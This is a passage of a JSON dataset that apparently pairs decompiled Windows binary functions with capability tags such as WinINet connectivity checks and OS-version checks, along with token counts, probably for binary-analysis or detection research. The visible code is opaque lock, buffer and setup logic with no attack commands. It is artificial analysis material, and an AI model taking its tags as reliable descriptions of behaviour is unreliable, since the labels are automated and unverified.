        "decompiled_code": "\nint32_t __cdecl fcn.00023840(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.000232a0(*(arg_8h + 0x34), arg_ch, arg_10h);\n    if (iVar1 == 0) {\n        var_4h = 0;\n    }\n    else {\n        var_4h = 0;\n        for (var_8h = *(iVar1 + 0x10); var_8h != 0; var_8h = *(var_8h + 0x14)) {\n            var_4h = var_4h + 0x40 + *(var_8h + 4);\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 204
    },
    "00023ba0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00023ba0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    if (*0x800cc664 == -1) {\n        iVar1 = fcn.00020dc0(arg_8h, arg_ch, 0x800cc664);\n        if (iVar1 == 0) {\n            *0x800ce684 = *(*0x800cc664 * 4 + -0x7ff24618) + 8;\n            *0x800ce688 = *(*(*0x800cc664 * 4 + -0x7ff24618) + 0x34);\n        }\n        else {\n            *0x800cc664 = -1;\n        }\n    }\n    else {\n        iVar1 = -1;\n    }\n    return iVar1;\n}\n",
        "token_count": 189
    },
    "00023c10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.00023c10(void)\n\n{\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (*0x800cc664 == -1) {\n        var_4h = 0;\n    }\n    else {\n        var_4h = fcn.000215a0(*0x800cc664, 0);\n        *0x800cc664 = -1;\n    }\n    fcn.00034a10(0x800db9e0);\n    for (var_8h = 0; (var_8h < 10 && (*(var_8h * 4 + -0x7ff24618) == 0)); var_8h = var_8h + 1) {\n    }\n    fcn.00034a80(0x800db9e0);\n    if (9 < var_8h) {\n        fcn.000349e0(0x800db9e0);\n        *0x800db9e4 = 0;\n    }\n    return var_4h;\n}\n",
        "token_count": 234
    },
    "00023cd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __cdecl fcn.00023cd0(int32_t *arg_8h, uint32_t arg_ch, int32_t arg_10h, int32_t *arg_14h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_ch < 10) {\n        while( true ) {\n            fcn.00034a10(0x800db9e0);\n            arg_8h_00 = *(arg_ch * 4 + -0x7ff24618);\n            if (arg_8h_00 == 0) break;\n            iVar1 = fcn.00034cb0(arg_8h_00 + 0x5c);\n            if (iVar1 != 0) {\n                if (arg_10h != 2) {\n                    fcn.00034a80(0x800db9e0);\n                }\n                *arg_14h = arg_8h_00 + 0x5c;\n                arg_14h[1] = arg_10h == 2;\n                if (arg_10h != 2) {\n                    iVar1 = *(arg_8h_00 + 0x2c);\n                    iVar2 = (**(*(arg_8h_00 + 0x44) + 0x14))(*(arg_8h_00 + 0x48), arg_8h_00 + 8, 0x2c, 0);\n                    if (iVar2 != 0) {\n                        fcn.00023e00(arg_14h);\n                        return 3;\n                    }\n                    if ((*(arg_8h_00 + 0x2c) != iVar1) && (iVar1 = fcn.00023e70(arg_8h_00),  iVar1 != 0)) {\n                        fcn.00023e00(arg_14h);\n                        return iVar1;\n                    }\n                }\n                if (arg_8h != NULL) {\n                    *arg_8h = arg_8h_00;\n                }\n                return 0;\n            }\n            fcn.00034a80(0x800db9e0);\n            fcn.00043cb0(10);\n        }\n        fcn.00034a80(0x800db9e0);\n    }\n    return 1;\n}\n",
        "token_count": 553
    },
    "00023e00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00023e00(uint *arg_8h)\n\n{\n    fcn.00034c90(*arg_8h);\n    if (arg_8h[1] != 0) {\n        fcn.00034a80(0x800db9e0);\n    }\n    return;\n}\n",
        "token_count": 71
    },
    "00023e70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_54h\n// WARNING: Variable defined which should be unmapped: var_50h\n// WARNING: Variable defined which should be unmapped: var_4ch\n// WARNING: Variable defined which should be unmapped: var_48h\n// WARNING: Variable defined which should be unmapped: var_44h\n\nint32_t __cdecl fcn.00023e70(int32_t arg_8h)\n\n{\n    uint uVar1;\n    int32_t *var_54h;\n    uint32_t var_50h;\n    int32_t *var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t var_1ch;\n    int32_t var_4h;\n    \n    var_50h = 0x2c;\n    var_4h = 0;\n    (**(*(arg_8h + 0x44) + 0x1c))(*(arg_8h + 0x48), 2, 0);\n    var_4ch = *(arg_8h + 0x38);\n    while (var_4ch != NULL) {\n        var_54h = var_4ch[7];\n        var_4h = (**(*(arg_8h + 0x44) + 0x14))(*(arg_8h + 0x48), &var_48h, 0x40, var_50h);\n        if (var_4h != 0) break;\n        var_4ch[3] = var_50h;\n        if (((*var_4ch == var_44h) && (var_4ch[1] == var_1ch)) && (var_4ch[2] == var_3ch)) {\n            if ((*var_4ch[8] != var_48h) || (*(var_4ch[8] + 4) != var_40h)) {\n                if ((var_40h == 0xffff) && (var_48h == *var_4ch[8])) {\n                    fcn.000234a0(arg_8h, var_4ch[8], *var_4ch);\n                }\n                else {\n                    if (var_48h != *var_4ch[8]) {\n                        var_4h = -1;\n                        break;\n                    }\n                    fcn.000234a0(arg_8h, var_4ch[8], var_44h);\n                    var_4h = fcn.00023130(arg_8h, var_48h, var_40h, var_44h, var_3ch, var_50h, var_1ch);\n                    if (var_4h != 0) break;\n                    uVar1 = fcn.000232a0(*(arg_8h + 0x34), var_48h, var_40h);\n                    fcn.00023660(uVar1);\n                }\n            }\n        }\n        else {\n            if (var_40h != 0xffff) {\n                var_4h = -1;\n                break;\n            }\n            var_54h = var_4ch;\n        }\n        var_50h = var_50h + 0x40 + var_1ch;\n        var_4ch = var_54h;\n    }\n    if (var_4h != 0) {\ncode_r0x000240b5:\n        if (var_4h != 0) {\n            var_4h = fcn.00022c30(arg_8h);\n        }\n        (**(*(arg_8h + 0x44) + 0x1c))(*(arg_8h + 0x48), 1);\n        return var_4h;\n    }\n    do {\n        if ((*(arg_8h + 0x1c) <= var_50h) ||\n           (var_4h = (**(*(arg_8h + 0x44) + 0x14))(*(arg_8h + 0x48), &var_48h, 0x40, var_50h),  var_4h != 0))\n        goto code_r0x000240b5;\n        if (var_40h != 0xffff) {\n            var_4h = fcn.00023130(arg_8h, var_48h, var_40h, var_44h, var_3ch, var_50h, var_1ch);\n            if (var_4h != 0) goto code_r0x000240b5;\n            uVar1 = fcn.000232a0(*(arg_8h + 0x34), var_48h, var_40h);\n            fcn.00023660(uVar1);\n        }\n        var_50h = var_50h + 0x40 + var_1ch;\n    } while( true );\n}\n",
        "token_count": 1100
    },
    "000240f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000240f0(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    if ((*(arg_8h + 0x60) != 0) && (*arg_ch == *(arg_8h + 100))) {\n        *arg_ch = *(arg_8h + 0x68);\n    }\n    return;\n}\n",
        "token_count": 82
    },
    "00024160": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00024160(uint *arg_8h, uint arg_ch)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    uint *arg_8h_00;\n    uint uVar3;\n    uint32_t var_980h;\n    uint var_97ch;\n    int32_t var_978h;\n    int32_t var_974h;\n    uint var_970h;\n    uint var_16ch;\n    uint var_168h;\n    uint var_158h;\n    int32_t var_128h;\n    uint var_124h;\n    int32_t var_114h;\n    uint var_110h;\n    uint var_dh;\n    uchar *var_4h;\n    \n    bVar1 = false;\n    var_974h = 0;\n    var_128h = 0;\n    if (*0x800ce68c != 0) {\n        return 0x21590064;\n    }\n    *0x800db8ac = 0;\n    fcn.00078ac8(0x800db8c0, arg_8h, 0x104);\n    *0x800db8b4 = arg_ch;\n    fcn.00078ac8(&var_110h, arg_8h, 0x104);\n    var_dh._0_1_ = 0;\n    var_4h = fcn.00078ace(&var_110h, 0x23);\n    if (var_4h == NULL) {\n        var_978h = -1;\n    }\n    else {\n        *var_4h = 0;\n        var_4h = var_4h + 1;\n        var_978h = fcn.00036370(var_4h, 0, 0);\n        arg_8h = &var_110h;\n    }\n    fcn.00024fc0(arg_8h, 0x80051a64, 1);\n    var_114h = fcn.00023ba0(arg_8h, 1);\n    if (var_114h == 0) {\n        if (var_978h == -1) {\n            var_114h = 0;\n        }\n        else {\n            var_114h = fcn.00023930(0xfffffffe, 0xb, &var_978h, &var_168h);\n            if (var_114h == 0) {\n                fcn.00023ca0(0xfffffffe, var_158h);\n            }\n            else {\n                fcn.00023c10();\n                if (var_978h != 1) {\n                    var_980h = var_114h + 0x191U | 0x21590000;\n                    goto code_r0x0002447f;\n                }\n            }\n        }\n        if ((var_114h == 0) && (var_114h = fcn.00029960(&var_124h, 0x10, 0x229),  var_114h != 0)) {\n            fcn.00023c10();\n        }\n    }\n    if (var_114h == 0) {\n        var_980h = 0;\n    }\n    else {\n        var_980h = var_114h + 0x191U | 0x21590000;\n        iVar2 = fcn.00024fc0(arg_8h, 0x80051a6c, 0);\n        if ((iVar2 != 0) || (iVar2 = fcn.00023ba0(arg_8h, 0),  iVar2 != 0)) goto code_r0x0002447f;\n        if (var_978h != -1) {\n            iVar2 = fcn.00023930(0xfffffffe, 0xb, &var_978h, &var_168h);\n            if (iVar2 != 0) {\n                fcn.00023c10();\n                goto code_r0x0002447f;\n            }\n            fcn.00023ca0(0xfffffffe, var_158h);\n        }\n        iVar2 = fcn.00029960(&var_124h, 0x10, 0x229);\n        if (iVar2 != 0) {\n            fcn.00023c10();\n            goto code_r0x0002447f;\n        }\n    }\n    var_974h = 1;\n    fcn.00029dc0(8, 0, var_980h, 0, 0);\n    fcn.000294e0(5, 0x800cdc55, 0x20, &var_16ch);\n    fcn.0002c500();\n    fcn.00024dc0(&var_970h, 0x800);\n    uVar3 = 0;\n    arg_8h_00 = &var_970h;\n    var_980h = fcn.000759d0(arg_8h_00);\n    if (var_980h == 0) {\n        bVar1 = true;\n        var_980h = fcn.0001d840(arg_8h_00, uVar3);\n        if (var_980h == 0) {\n            var_128h = 1;\n            var_980h = fcn.00024500(arg_ch);\n            if (var_980h == 0) {\n                var_980h = 0;\n                *0x800ce68c = 1;\n            }\n        }\n    }\ncode_r0x0002447f:\n    if (var_974h != 0) {\n        fcn.00029dc0(9, 0, var_980h, 0, 0);\n    }\n    if (var_980h != 0) {\n        if (var_128h != 0) {\n            fcn.00024980();\n            fcn.0002d580();\n            fcn.00027130();\n            fcn.0002aed0();\n            fcn.0006d970();\n        }\n        if (bVar1) {\n            fcn.00075bc0();\n        }\n        if (var_974h != 0) {\n            fcn.0002c910(0xfffffffe);\n            fcn.0002c520();\n            fcn.00023c10();\n        }\n    }\n    return var_980h;\n}\n",
        "token_count": 1417
    },
    "00024500": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00024500(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    int32_t var_74h;\n    uint var_70h;\n    uint var_4h;\n    \n    fcn.000270d0();\n    fcn.0002ad90();\n    fcn.0002d550();\n    fcn.000248b0();\n    fcn.000262f0();\n    var_70h._0_1_ = '\\0';\n    fcn.000294e0(0x22b, &var_70h, 100, &var_4h);\n    if (var_70h != '\\0') {\n        arg_8h = 0;\n    }\n    *0x800db9c8 = arg_8h;\n    if (arg_8h == 0) {\n        iVar1 = fcn.000344b0(0x800db8b8);\n        if ((iVar1 == 0) || (iVar1 = fcn.000344b0(0x800db8a4),  iVar1 == 0)) {\n            var_74h = fcn.00035ae0();\n            goto code_r0x00024647;\n        }\n        uVar4 = 0;\n        uVar3 = 0;\n        uVar2 = 0x80065780;\n        iVar1 = fcn.0001ace0(0x800cd0c4, 0x80065780, 0);\n        if (iVar1 != 0) {\n            var_74h = fcn.00035ae0();\n            goto code_r0x00024647;\n        }\n        iVar1 = fcn.000298c0(300, 0);\n        if (iVar1 != 0) {\n            iVar1 = fcn.000344b0(0x800db8a8);\n            if ((iVar1 == 0) || (iVar1 = fcn.000344b0(0x800db9c4),  iVar1 == 0)) {\n                var_74h = fcn.00035ae0(uVar2, uVar3, uVar4);\n                goto code_r0x00024647;\n            }\n            iVar1 = fcn.0001ace0(0x800cd0f4, 0x80065880, 0);\n            if (iVar1 != 0) {\n                var_74h = fcn.00035ae0();\n                goto code_r0x00024647;\n            }\n        }\n    }\n    else {\n        iVar1 = fcn.000344b0(0x800db8b0);\n        if (iVar1 == 0) {\n            var_74h = fcn.00035ae0();\n            goto code_r0x00024647;\n        }\n        iVar1 = fcn.0001ace0(0x800cd0fc, 0x80065980, 0);\n        if (iVar1 != 0) {\n            var_74h = fcn.00035ae0();\n            goto code_r0x00024647;\n        }\n    }\n    var_74h = 0;\ncode_r0x00024647:\n    if (var_74h != 0) {\n        if (arg_8h == 0) {\n            iVar1 = fcn.00037730(0x800db8a4);\n            if (iVar1 != 0) {\n                fcn.00034540(0x800db8a4);\n            }\n            iVar1 = fcn.00037730(0x800db9c4);\n            if (iVar1 != 0) {\n                fcn.00034540(0x800db9c4);\n            }\n            iVar1 = fcn.00037730(0x800cd0c4);\n            if (iVar1 != 0) {\n                fcn.000377b0(0x800cd0c4);\n                fcn.00037710(0x800cd0c4);\n            }\n            iVar1 = fcn.00037730(0x800cd0f4);\n            if (iVar1 != 0) {\n                fcn.000377b0(0x800cd0f4);\n                fcn.00037710(0x800cd0f4);\n            }\n            iVar1 = fcn.00037730(0x800db8b8);\n            if (iVar1 != 0) {\n                fcn.00034540(0x800db8b8);\n            }\n            iVar1 = fcn.00037730(0x800db8a8);\n            if (iVar1 != 0) {\n                fcn.00034540(0x800db8a8);\n            }\n        }\n        else {\n            iVar1 = fcn.00037730(0x800db8b0);\n            if (iVar1 != 0) {\n                fcn.00034540(0x800db8b0);\n            }\n            iVar1 = fcn.00037730(0x800cd0fc);\n            if (iVar1 != 0) {\n                fcn.000377b0(0x800cd0fc);\n                fcn.00037710(0x800cd0fc);\n            }\n        }\n    }\n    return var_74h;\n}\n",
        "token_count": 1196
    },
    "00024750": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00024750(void)\n\n{\n    int32_t iVar1;\n    \n    if (*0x800ce68c != 0) {\n        fcn.00029dc0(10, 0, 0, 0, 0);\n        *0x800db8ac = 1;\n        iVar1 = fcn.00037730(0x800db8b8);\n        if (iVar1 != 0) {\n            fcn.00034570(0x800db8b8);\n            if (*0x800db8a0 != 0) {\n                fcn.000775b0(0x800db8a0, 0);\n            }\n            fcn.000345a0(0x800db8a4, 0xffffffff);\n            fcn.00037710(0x800cd0c4);\n            fcn.00034540(0x800db8b8);\n            fcn.00034540(0x800db8a4);\n        }\n        iVar1 = fcn.00037730(0x800db8a8);\n        if (iVar1 != 0) {\n            fcn.00034570(0x800db8a8);\n            fcn.000345a0(0x800db9c4, 0xffffffff);\n            fcn.00037710(0x800cd0f4);\n            fcn.00034540(0x800db8a8);\n            fcn.00034540(0x800db9c4);\n        }\n        iVar1 = fcn.00037730(*0x800db9c8);\n        if ((iVar1 != 0) && (iVar1 = fcn.00037730(0x800db8b0),  iVar1 != 0)) {\n            fcn.00034570(*0x800db9c8);\n            fcn.000345a0(0x800db8b0, 0xffffffff);\n            fcn.00037710(0x800cd0fc);\n            fcn.00034540(0x800db8b0);\n        }\n        fcn.00024980();\n        fcn.0002d580();\n        fcn.0002aed0();\n        fcn.00027130();\n        fcn.0006d970();\n        fcn.00075bc0();\n        fcn.0002c910(0xfffffffe);\n        fcn.0002c520();\n        fcn.00029dc0(0xb, 0, 0, 0, 0);\n        fcn.00023c10();\n        *0x800ce68c = 0;\n    }\n    return;\n}\n",
        "token_count": 588
    },
    "000248b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.000248b0(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_214h;\n    uint var_210h;\n    uint var_110h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = fcn.000298c0(100, 0);\n    var_ch = 0;\n    for (var_8h = 0; var_8h < var_4h; var_8h = var_8h + 1) {\n        iVar1 = fcn.000294e0(var_8h + 0x65, &var_210h, 0x100, &var_214h);\n        if (iVar1 == 0) {\n            var_110h._0_1_ = 0;\n            fcn.000294e0(var_8h + 0x70, &var_110h, 0x100, &var_214h);\n            uVar2 = fcn.000249d0(&var_210h, &var_110h);\n            *(var_ch * 4 + -0x7ff32f34) = uVar2;\n            if (*(var_ch * 4 + -0x7ff32f34) != 0) {\n                var_ch = var_ch + 1;\n            }\n        }\n    }\n    fcn.0004c5a0();\n    fcn.000383c0();\n    fcn.000175b0();\n    return;\n}\n",
        "token_count": 358
    },
    "00024980": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.00024980(uint param_1)\n\n{\n    uint32_t var_4h;\n    \n    fcn.0006d970(param_1);\n    for (var_4h = 0; var_4h < 10; var_4h = var_4h + 1) {\n        if (*(var_4h * 4 + -0x7ff32f34) != 0) {\n            fcn.000775b0(var_4h * 4 + -0x7ff32f34, 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 148
    },
    "000249d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000249d0(uint arg_8h, char *arg_ch)\n\n{\n    char cVar1;\n    uchar *puVar2;\n    char *arg_ch_00;\n    uint var_5ch;\n    char *var_58h;\n    char *var_54h;\n    uint var_50h;\n    uint var_48h;\n    char *var_44h;\n    uint var_40h;\n    uint var_38h;\n    char *var_34h;\n    uint var_30h;\n    uint var_2ch;\n    char *var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    char *var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_ch = fcn.00035820(arg_8h);\n    if (var_ch == 0) {\n        var_14h = 0;\n    }\n    else {\n        puVar2 = fcn.00078a44(var_ch, 0x2f);\n        if (puVar2 == NULL) {\n            var_18h = puVar2;\n            fcn.000357f0(var_ch);\n            var_14h = 0;\n        }\n        else {\n            *puVar2 = 0;\n            var_18h = puVar2 + 1;\n            var_8h = var_ch;\n            var_4h = 0;\n            var_34h = var_18h;\n            do {\n                cVar1 = *var_34h;\n                var_34h = var_34h + 1;\n            } while (cVar1 != '\\0');\n            var_10h = fcn.00077170(&var_14h, &var_8h, var_18h, var_34h + (1 - (puVar2 + 2)), 1);\n            fcn.000357f0(var_ch);\n            if (var_10h == 0) {\n                if (arg_ch != NULL) {\n                    var_44h = arg_ch;\n                    do {\n                        cVar1 = *var_44h;\n                        var_44h = var_44h + 1;\n                    } while (cVar1 != '\\0');\n                    arg_ch_00 = fcn.000356c0(var_44h + (2 - (arg_ch + 1)));\n                    if (arg_ch_00 == NULL) {\n                        fcn.000775b0(&var_14h, 0);\n                        return 0;\n                    }\n                    var_54h = arg_ch;\n                    var_58h = arg_ch_00;\n                    do {\n                        cVar1 = *var_54h;\n                        *var_58h = cVar1;\n                        var_54h = var_54h + 1;\n                        var_58h = var_58h + 1;\n                    } while (cVar1 != '\\0');\n                    arg_ch_00[var_44h + (2 - (arg_ch + 1)) + -1] = '\\0';\n                    for (var_28h = arg_ch_00; *var_28h != '\\0'; var_28h = var_28h + 1) {\n                        if (*var_28h == ',') {\n                            *var_28h = '\\0';\n                        }\n                    }\n                    var_10h = fcn.000776c0(var_14h, arg_ch_00, 0);\n                    if (var_10h != 0) {\n                        fcn.00029dc0(8, 0, var_10h, 0, 0);\n                        fcn.000357f0(arg_ch_00);\n                        fcn.000775b0(&var_14h, 0);\n                        return 0;\n                    }\n                    fcn.000357f0(arg_ch_00);\n                }\n                var_20h = 0;\n                var_1ch = 0;\n                var_24h = 0x80064d60;\n                fcn.00077780(var_14h, 2, &var_24h, 0xc, 0);\n                fcn.00077780(var_14h, 5, 0x80064d80, 0, 0);\n                var_10h = fcn.000778a0(var_14h, 0x80064c50, 0, 0);\n                if (var_10h != 0) {\n                    fcn.00029dc0(8, 0, var_10h, 0, 0);\n                    fcn.000775b0(&var_14h, 0);\n                    var_14h = 0;\n                }\n            }\n            else {\n                fcn.00029dc0(8, 0, var_10h, 0, 0);\n                var_14h = 0;\n            }\n        }\n    }\n    return var_14h;\n}\n",
        "token_count": 1115
    },
    "00024c50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00024c50(uint arg_8h, uint arg_ch, uint *arg_10h, uint32_t arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t *arg_ch_00;\n    uint var_11ch;\n    uint var_118h;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_14h < 0x15) {\n        uVar1 = 0x21590064;\n    }\n    else {\n        var_18h = *arg_10h;\n        var_14h = arg_10h[1];\n        var_10h = arg_10h[2];\n        var_ch = arg_10h[3];\n        var_8h = arg_10h[4];\n        var_4h._0_1_ = *(arg_10h + 5);\n        fcn.00024120(&var_18h);\n        if ((var_14h & 0x80000000) == 0) {\n            if ((var_10h == '\\x02') && (arg_ch_00 = fcn.00077f80(arg_8h, 4, 0),  arg_ch_00 != NULL)) {\n                *arg_ch_00 = var_14h;\n                fcn.000780f0(arg_8h, arg_ch_00);\n            }\n        }\n        else {\n            iVar2 = fcn.000298c0(3, 0);\n            if ((iVar2 != 0) && (iVar2 = fcn.00078090(arg_8h, 4, &var_118h, 0x100, 0),  iVar2 == 0)) {\n                fcn.0002a4c0(var_14h & 0x7fffffff, &var_118h);\n            }\n        }\n        uVar1 = fcn.000271f0(arg_8h, arg_ch, arg_10h + 0x15, arg_14h - 0x15, arg_18h, arg_1ch, &var_18h);\n    }\n    return uVar1;\n}\n",
        "token_count": 531
    },
    "00024d80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00024d80(uint noname_0, uint32_t *arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint32_t arg_8h;\n    uint var_4h;\n    \n    if (((arg_ch != NULL) && (arg_8h = *arg_ch,  arg_8h != 0)) && ((arg_8h & 0x80000000) == 0)) {\n        fcn.00027930(arg_8h, arg_10h, arg_14h, arg_18h);\n    }\n    return;\n}\n",
        "token_count": 140
    },
    "00024dc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00024dc0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint var_14ch;\n    uint var_144h;\n    uint *var_140h;\n    uint var_138h;\n    char *var_134h;\n    uint *var_130h;\n    uint var_12ch;\n    uint var_124h;\n    uint *var_120h;\n    char *var_11ch;\n    uint var_118h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    var_11ch = NULL;\n    var_8h = 0;\n    do {\n        if (9 < var_8h) {\ncode_r0x00024fad:\n            var_11ch[arg_8h] = '\\0';\n            return;\n        }\n        iVar2 = fcn.000294e0(var_8h + 0x191, &var_118h, 0x104, &var_4h);\n        if (iVar2 == 0) {\n            if (var_118h == '&') {\n                var_ch = fcn.00036370(&var_118h + 1, 0, 0);\n                if ((var_ch == 0) || (iVar2 = fcn.0002c540(var_ch, 0xfffffffe, 1, 0, &var_118h),  iVar2 != 0))\n                goto code_r0x00024ddc;\n            }\n            else {\n                var_ch = 0;\n            }\n            var_120h = &var_118h;\n            do {\n                cVar1 = *var_120h;\n                var_120h = var_120h + 1;\n            } while (cVar1 != '\\0');\n            if ((arg_ch - var_11ch) + -1 <= var_120h + (1 - (&var_118h + 1))) {\n                if (var_ch != 0) {\n                    fcn.0002c840(var_ch);\n                }\n                goto code_r0x00024fad;\n            }\n            var_130h = &var_118h;\n            var_134h = var_11ch + arg_8h;\n            do {\n                cVar1 = *var_130h;\n                *var_134h = cVar1;\n                var_130h = var_130h + 1;\n                var_134h = var_134h + 1;\n            } while (cVar1 != '\\0');\n            var_140h = &var_118h;\n            do {\n                cVar1 = *var_140h;\n                var_140h = var_140h + 1;\n            } while (cVar1 != '\\0');\n            var_11ch = var_140h + var_11ch + (1 - (&var_118h + 1));\n        }\ncode_r0x00024ddc:\n        var_8h = var_8h + 1;\n    } while( true );\n}\n",
        "token_count": 682
    },
    "00024fc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
